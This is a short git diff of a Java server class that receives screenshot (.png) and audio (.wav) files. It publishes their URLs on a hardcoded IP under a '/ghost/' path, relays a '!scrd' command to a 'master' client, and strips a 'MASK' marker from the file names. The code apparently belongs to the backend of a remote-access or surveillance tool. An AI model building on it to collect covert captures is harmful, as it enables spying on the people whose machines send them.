@@ -23,9 +23,9 @@ public class FileReceiveEvent implements TaskEvent {
         }
         //删除MASK标志
         String fileName=fileInfo.getSavePath() + "/" + fileInfo.getName();
-        if((fileInfo.getName().endsWith(".png")||fileInfo.getName().endsWith(".wav"))&&!fileInfo.getName().contains("quiet")) {
-            Out.say("HandleConn", "广播,url:http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileName);
-            ServerMain.sendToSpecificMaster("!scrd http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileInfo.getSavePath() + "/" + fileInfo.getName() + "\n", "screenShot");
+        if((fileInfo.getName().replaceAll("MASK","").endsWith(".png")||fileInfo.getName().endsWith(".wav"))&&!fileInfo.getName().contains("quiet")) {
+            Out.say("HandleConn", "广播,url:http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileName.replaceAll("MASK",""));
+            ServerMain.sendToSpecificMaster("!scrd http://39.100.5.139/ghost/" + ServerMain.fileReceiver.getRootPath() + fileInfo.getSavePath() + "/" + fileInfo.getName().replaceAll("MASK","") + "\n", "screenShot");
         }
         if (!fileInfo.getName().contains("quiet"))
             Out.putPrompt();
